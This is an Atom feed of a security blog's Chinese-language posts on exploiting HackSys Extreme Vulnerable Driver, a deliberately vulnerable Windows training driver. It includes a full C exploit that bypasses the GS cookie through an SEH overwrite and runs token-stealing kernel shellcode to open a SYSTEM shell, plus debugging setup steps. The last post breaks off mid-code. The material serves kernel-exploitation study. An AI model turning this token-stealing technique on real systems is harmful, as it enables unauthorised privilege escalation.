<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2025-02-18T02:59:48.238Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[HEVD]enable GS</title>
    <link href="https://ixout.github.io/posts/13921/"/>
    <id>https://ixout.github.io/posts/13921/</id>
    <published>2025-02-17T09:42:34.000Z</published>
    <updated>2025-02-18T02:59:48.238Z</updated>
    
    <content type="html"><![CDATA[<p>接下来要面对的就是开启了gs保护的栈溢出了</p><h1 id="gs保护"><a href="#gs保护" class="headerlink" title="gs保护"></a>gs保护</h1><p>gs保护其实就类似linux下的canary保护,都是在函数返回前校验原先存储在栈上的特殊值是否被修改,以此判断是否遭受了溢出攻击</p><p>程序启动时系统会随机生成一个cookie值,并将这个值的副本保存在<code>.data</code>段的开头</p><p>每个函数开始执行时都会将该值与栈指针寄存器异或并保存在栈中,返回时再次与栈指针寄存器异或检查一致</p><p>上一次目标关闭了gs保护(通过<code>__declspec</code>关键字)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(safebuffers)</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStack</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure><p>而这一次不再关闭</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStackGS</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><p>在32位下,绕过gs常用的办法是利用SEH机制,这个在以前的文章已经介绍过了,不再着重介绍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    EXCEPTION_REGISTRATION_RECORD* Next; <span class="comment">// 指向下一个 SEH 节点的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;         <span class="comment">// 异常处理函数的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们要做的就是覆盖Handler字段,并在触发gs检查之前先触发异常</p><p>还是看栈结构</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-02-18_102946.png" alt=""></p><p>红色圈起来的部分上面就是seh handler,下面则是返回地址</p><p>在修改handler后,我们就需要触发异常,选择的办法就是利用memcpy触发,就是将我们的payload放置在一个单独页的尾部,然后给出的size超过这个页,使得触发非法访问异常</p><p>我们要覆盖的就是handler,距离是<code>aa8 - 894 = 214</code></p><p>让我们看exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HACKSYS_HEVD_IOCTL_STACK_OVERFLOW_GS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_OFFSET     0x124  <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_OFFSET    0x050  <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET         0x0B4  <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLINK_OFFSET       0x0B8  <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET       0x0F8  <span class="comment">// nt!_EPROCESS.Token</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PID         0x004  <span class="comment">// SYSTEM Process PID</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHARED_MEMORY_NAME <span class="string">&quot;HackSysExtremeVulnerableDriverSharedMemory&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"><span class="comment">// token-stealing shellcode taken from hasherezade&#x27;s PoC</span></span><br><span class="line"><span class="comment">// stub taken from https://klue.github.io/blog/2017/09/hevd_stack_gs/ this write up (found the same stack offsets manually earlier), rewrote it to AT&amp;T, generated opcodes, tested</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> kShellcode[] = &#123;</span><br><span class="line"><span class="comment">/* token-stealing code:</span></span><br><span class="line"><span class="comment"> 0:   60                      pusha</span></span><br><span class="line"><span class="comment"> 1:   64 a1 24 01 00 00       mov    %fs:0x124,%eax</span></span><br><span class="line"><span class="comment"> 7:   8b 40 50                mov    0x50(%eax),%eax</span></span><br><span class="line"><span class="comment"> a:   89 c1                   mov    %eax,%ecx</span></span><br><span class="line"><span class="comment"> c:   ba 04 00 00 00          mov    $0x4,%edx</span></span><br><span class="line"><span class="comment">11:   8b 80 b8 00 00 00       mov    0xb8(%eax),%eax</span></span><br><span class="line"><span class="comment">17:   2d b8 00 00 00          sub    $0xb8,%eax</span></span><br><span class="line"><span class="comment">1c:   39 90 b4 00 00 00       cmp    %edx,0xb4(%eax)</span></span><br><span class="line"><span class="comment">22:   75 ed                   jne    0x11</span></span><br><span class="line"><span class="comment">24:   8b 90 f8 00 00 00       mov    0xf8(%eax),%edx</span></span><br><span class="line"><span class="comment">2a:   8b b9 f8 00 00 00       mov    0xf8(%ecx),%edi</span></span><br><span class="line"><span class="comment">30:   83 e2 f8                and    $0xfffffff8,%edx</span></span><br><span class="line"><span class="comment">33:   83 e7 07                and    $0x7,%edi</span></span><br><span class="line"><span class="comment">36:   01 fa                   add    %edi,%edx</span></span><br><span class="line"><span class="comment">38:   89 91 f8 00 00 00       mov    %edx,0xf8(%ecx)</span></span><br><span class="line"><span class="comment">3e:   61                      popa</span></span><br><span class="line"><span class="comment">3f:   31 c0                   xor    %eax,%eax</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x64</span>, <span class="number">0xA1</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2D</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x90</span>, <span class="number">0xB4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0xED</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x83</span>, <span class="number">0xE7</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0xFA</span>, <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="comment">/* now, kernel clean return stub:</span></span><br><span class="line"><span class="comment">mov (esp+0x78c), %edi</span></span><br><span class="line"><span class="comment">mov (esp+0x790), %esi</span></span><br><span class="line"><span class="comment">mov (esp+0x794), %ebx</span></span><br><span class="line"><span class="comment">add $0x9b8, %esp</span></span><br><span class="line"><span class="comment">pop %ebp</span></span><br><span class="line"><span class="comment">ret $0x8</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0x24</span>, <span class="number">0x8c</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0xb4</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x07</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0x9c</span>, <span class="number">0x24</span>, <span class="number">0x94</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x81</span>, <span class="number">0xc4</span>, <span class="number">0xb8</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5d</span>, <span class="number">0xc2</span>, <span class="number">0x08</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> kDevName[] = <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">open_device</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* device_name)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE device = CreateFileA(device_name,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> device;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">close_device</span><span class="params">(HANDLE device)</span></span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(device);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">send_ioctl</span><span class="params">(HANDLE device, DWORD ioctl_code)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Payatu&#x27;s official HEVD exploit code instead</span></span><br><span class="line"><span class="comment">// For now let&#x27;s go with Payatu&#x27;s code ;]</span></span><br><span class="line">ULONG BytesReturned;</span><br><span class="line">SIZE_T PageSize = <span class="number">0x1000</span>; <span class="comment">// 4096</span></span><br><span class="line">HANDLE Sharedmemory = <span class="literal">NULL</span>;</span><br><span class="line">PVOID MemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">PVOID SuitableMemoryForBuffer = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID SharedMappedMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T SeHandlerOverwriteOffset = <span class="number">0x214</span>; <span class="comment">// 532, this our payload length, we put it in the last 532 bytes of a 4096-byte (one page) memory block</span></span><br><span class="line"><span class="comment">// A*512 + DWORD XORED COOKIE + 3 DWORD JUNKS + DWORD SE HANDLER = 512+4+12+4 = 532</span></span><br><span class="line"><span class="comment">// deliberately, so reading past this range will cause an exception in kernel mode, which in turn should trigger the SEH handler we just overwrote</span></span><br><span class="line">LPCTSTR SharedMemoryName = (LPCSTR)SHARED_MEMORY_NAME;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the device handle</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Creating Shared Memory\n&quot;</span>);</span><br><span class="line"><span class="comment">// Create the shared memory</span></span><br><span class="line">Sharedmemory = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, PageSize, SharedMemoryName); <span class="comment">// Create a 4KB mapping</span></span><br><span class="line"><span class="keyword">if</span> (!Sharedmemory) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[-] Failed To Create Shared Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] Shared Memory Handle: 0x%p\n&quot;</span>, Sharedmemory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Mapping Shared Memory To Current Process Space\n&quot;</span>);</span><br><span class="line"><span class="comment">// Map the shared memory in the process space of this process</span></span><br><span class="line">SharedMappedMemoryAddress = MapViewOfFile(Sharedmemory, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, PageSize); <span class="comment">// Mapped view of file - a virtual address in user space, one page 4KB</span></span><br><span class="line"><span class="keyword">if</span> (!SharedMappedMemoryAddress) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[-] Failed To Map Shared Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] Mapped Shared Memory: 0x%p\n&quot;</span>, SharedMappedMemoryAddress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset)); <span class="comment">// set this to 3564-th byte, the beginning of our payload</span></span><br><span class="line"><span class="comment">// e.g. 0x1000 (4096) + (4096 - 532 = 3564), which means that our payload (A*512+DWORD (COOKIE) + 3 DWORDS (JUNK) + DWORD (EIP SEHANDLER)) MUST START HERE</span></span><br><span class="line"><span class="comment">// so our payload should be 532-bytes long</span></span><br><span class="line"><span class="comment">// and reading past it will cause reading past the 4096 byte-long SharedMappedMemoryAddress - and cause an exception while in kernel mode</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Suitable Memory For Buffer: 0x%p\n&quot;</span>, SuitableMemoryForBuffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">RtlFillMemory(SharedMappedMemoryAddress, PageSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">MemoryAddress = (PVOID)((ULONG)SuitableMemoryForBuffer + <span class="number">0x210</span>); <span class="comment">// SE handler</span></span><br><span class="line">*(PULONG)MemoryAddress = (ULONG)kShellcode;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] SE Handler Value: 0x%p\n&quot;</span>, *(PULONG)MemoryAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t[+] SE Handler Address: 0x%p\n&quot;</span>, MemoryAddress);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, kShellcode); <span class="comment">// kShellcode</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Triggering Kernel Stack Overflow GS\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Making the driver read from usermode %x to %x.\n&quot;</span>, (ULONG)SuitableMemoryForBuffer, (ULONG)((ULONG)SuitableMemoryForBuffer + (ULONG)SeHandlerOverwriteOffset));</span><br><span class="line">OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"><span class="comment">// RAISE_EXCEPTION_IN_KERNEL_MODE is just a predefined constant (0x4) || NOW DEBUG AGAIN (WITHOUT 0x4 OFFSET) TO SEE IF WE OVERWRITE THE RIGHT POINTERS IN MEMORY (before we hit the canary-checking function, we can see this with a breakpoint right after memcpy call)</span></span><br><span class="line">DeviceIoControl(device, ioctl_code, (LPVOID)SuitableMemoryForBuffer, (DWORD)SeHandlerOverwriteOffset + <span class="number">0x4</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, &amp;BytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// Debugger entered on first try; Bugcheck callbacks have not been invoked.</span></span><br><span class="line">OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE dev = open_device(kDevName);</span><br><span class="line"><span class="keyword">if</span> (dev == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">send_ioctl(dev, HACKSYS_HEVD_IOCTL_STACK_OVERFLOW_GS);</span><br><span class="line">close_device(dev);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">// we should be SYSTEM now, spawn cmd.exe</span></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前普通的栈溢出差别在于</p><ol><li><p>通过 <code>CreateFileMapping</code> 和 <code>MapViewOfFile</code> 申请 4KB <strong>用户态</strong> 共享内存。</p><p>并将payload放置在共享内存的尾部位置,偏移是<code>0x1000 - 0x214 = 0xdec</code></p></li><li><p>触发DeviceIoControl时,传入一个使得memcpy会在复制完payload后会继续访问不存在地址的size,使得memcpy触发异常,进入shellcode的执行</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-02-18_105413.png" alt=""></p><p>可以看到handler已经被修改为shellcode的地址,但不知道为什么触发异常以后并没有执行这个handler,奇怪</p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>32 位系统的 SEH 信息保存在栈中,然而64位的SEH保存在一个表结构中, 这就意味着我们没法通过覆盖SEH来做到漏洞利用</p>]]></content>
    
    
    <summary type="html">ddddd</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="HEVD" scheme="https://ixout.github.io/tags/HEVD/"/>
    
  </entry>
  
  <entry>
    <title>[HEVD]栈溢出与windows提权</title>
    <link href="https://ixout.github.io/posts/16788/"/>
    <id>https://ixout.github.io/posts/16788/</id>
    <published>2025-01-13T12:15:31.000Z</published>
    <updated>2025-02-17T09:45:14.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>环境的准备较为简单</p><h2 id="被调试方"><a href="#被调试方" class="headerlink" title="被调试方"></a>被调试方</h2><p>之前学linux内核使用的是qemu仿真,对于windows来说就不那么适合了,所以还是在vmware中增加一个虚拟机</p><p>HEVD提供了x32和x64的版本,我们也准备两个被调试环境,分别是win7_x32和win10_x64(win11_x64也行)</p><p>之所以要两个环境主要是因为win7_x32的保护机制更少,便于我们直接关注漏洞的本质,但win7_x32已经太过久远所以我们也许还要在一些较新的版本上验证我们的攻击有效</p><p>构建调试环境参考博客<a href="https://blog.csdn.net/weixin_43790779/article/details/115873938">WinDbg 双机调试（调试机为Windows10系统，被调试机为Windows7系统）</a></p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ol><li>KmdManager,用于加载驱动</li><li>visual studio,exp编写</li><li>DebugView,在被调试方也显示内核调试信息</li><li>windbg</li><li>virtualKD-redux,windows内核调试神器,如果受不了windbg正常调试时的逆天延迟,推荐该工具</li></ol><h1 id="熟悉HEVD"><a href="#熟悉HEVD" class="headerlink" title="熟悉HEVD"></a>熟悉HEVD</h1><p>HEVD（HackSys Extreme Vulnerable Driver）是一个专为内核安全学习设计的漏洞驱动程序，由HackSys Team开发。它故意引入了多种常见内核漏洞（如栈溢出、堆溢出、UAF等），供学习者分析和利用</p><p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">hacksysteam/HackSysExtremeVulnerableDriver：HackSys Extreme Vulnerable Driver (HEVD) - Windows &amp; Linux </a></p><h2 id="驱动装载"><a href="#驱动装载" class="headerlink" title="驱动装载"></a>驱动装载</h2><p>下载release中已经编译好的驱动</p><p>管理员身份打开DebugView并勾选如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213907.png" alt=""></p><p>管理员身份打开KmdManager,选择带有漏洞的x86版本驱动加载</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213425.png" alt=""></p><p>注意,只有在被调试器附加的情况下,驱动才能成功加载</p><p>成功加载时就能在windbg或Debugview中看到banner了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_213953.png" alt=""></p><p>在windbg中使用命令<code>lm m H*</code>也能看到其已经成功加载</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214058.png" alt=""></p><p>此时驱动是尚未加载符号的</p><p>使用命令确认符号加载路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!sym noisy</span><br><span class="line">x /D HEVD!</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214656.png" alt=""></p><p>那么创建<code>符号文件路径\HEVD.pdb\XXXXXXX</code>路径,并将下载的pdb文件移动到此处</p><p><code>.reload</code>重新加载后再次执行命令<code>x /D HEVD!</code>,即可查看HEVD的所有符号</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_214957.png" alt=""></p><p><code>!drvobj HEVD 2</code>查看驱动详细信息</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215318.png" alt=""></p><h2 id="样例exp"><a href="#样例exp" class="headerlink" title="样例exp"></a>样例exp</h2><p>让我们尝试运行仓库提供的exp查看能否成功提权</p><p>克隆仓库, vs studio打开exploit目录下的项目文件</p><p>选择release版本编译生成,获得exp样例,</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_215748.png" alt=""></p><p>使用命令<code>HackSysEVDExploit.exe -c cmd.exe -s</code>测试</p><p>成功提权</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-13_220207.png" alt=""></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>一些简单的windows内核相关知识,便于理解接下来的内容</p><h2 id="驱动结构"><a href="#驱动结构" class="headerlink" title="驱动结构"></a>驱动结构</h2><p>Windows 内核主要使用 C 语言实现，并通过函数指针、结构体和回调机制等方式模拟面向对象的编程模式</p><p>驱动对象：一个驱动对象就对应一个驱动程序，在Windows中加载这样一个结构，实际上时告诉系统需要提供哪些东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span>  </span><br><span class="line"> <span class="comment">//  结构的类型和大小。  </span></span><br><span class="line">      CSHORT Type;  </span><br><span class="line">      CSHORT Size;  </span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 设备对象的指针，注意这里实际上是一个设备对象的链表的开始。</span></span><br><span class="line"><span class="comment">一个驱动程序可以拥有多个设备对象，并且这些对象用链表的形式连接起来。*/</span></span><br><span class="line">      PDEVICE_OBJECT DeviceObject;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  驱动对象的 Unicode 符号链接名称</span></span><br><span 